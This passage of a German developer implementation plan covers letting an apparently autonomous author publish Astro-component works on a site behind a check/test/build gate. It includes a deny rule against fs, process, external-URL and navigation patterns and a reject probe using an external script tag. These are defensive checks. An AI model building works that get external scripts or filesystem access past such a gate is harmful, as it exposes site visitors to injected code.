- [ ] **Step 3: Add the PROTOCOL section**

In `PROTOCOL.md` nach „Werkzeuge frei." einen Abschnitt „Erstklassige Werke (Astro im Lab)" ergänzen: sie darf statt `index.html` ein `works/<slug>/work.astro` (Astro-Komponente) bauen, das nativ als `/atelier/werke/<slug>` erscheint, geteiltes Design nutzt und committete Datensätze liest (siehe `SITE-API.md`); es geht live, wenn das Gate (`check/test/build`) grün ist; bei Rot liegt ein Hinweis in `atelier-feedback/<datum>.md`, den sie zuerst liest und behebt; HTML-Werke (iframe) bleiben gleichwertig erlaubt; verbotene Muster (fs/process/externe URLs/Navigation) führen zu Reject.

- [ ] **Step 4: Commit (in irrtum-als-methode)**

```bash
cd /pfad/zu/irrtum-als-methode
git add SITE-API.md works/2026-06-30-beispiel-erstklassig PROTOCOL.md
git commit -m "docs: erstklassige Astro-Werke — SITE-API, Beispiel, PROTOCOL-Abschnitt"
```

---

## Abschluss-Verifikation (nach allen Tasks)

- [ ] `npm run check && npm test && npm run build` grün im Site-Repo.
- [ ] Manueller Integrations-Probelauf: `npx tsx scripts/atelier/integrate.ts /tmp/atelier .` mit dem Beispielwerk → `accepted: [{ slug: 'beispiel…', kind: 'astro' }]`, Wrapper-Seite + Komponente erzeugt, `npm run build` grün, `/atelier/werke/beispiel-erstklassig` rendert.
- [ ] Reject-Probe: ein Werk mit `<script src="https://…">` → landet in `rejected`, wird nicht kopiert.
- [ ] CSP: `public/_headers` + Astro-CSP aktiv; Bestandsseiten ohne Konsolen-Verstöße.

## Self-Review-Notiz (Spec-Abdeckung)

Spec-Komponenten → Tasks: Autoren-Modell §K1 → T8/T1; Gate §K2 → T4/T5; Datenzugang §K3 → T8/SITE-API + T1 (Mapping); Besuchersicherheit §K4 → T7 (+ T2 Reject); Fehlerbehandlung §K5 → T5; „wie Ulysses erfährt" §K6 → T8; Koexistenz → T6. Pfad-Grenze ist strukturell in T1/T4 (nur definierte Ziele werden kopiert). Offene Spec-Risiken (CSP-API-Detail, exaktes Mapping) sind in T7/T1 als Umsetzer-Hinweise verankert.
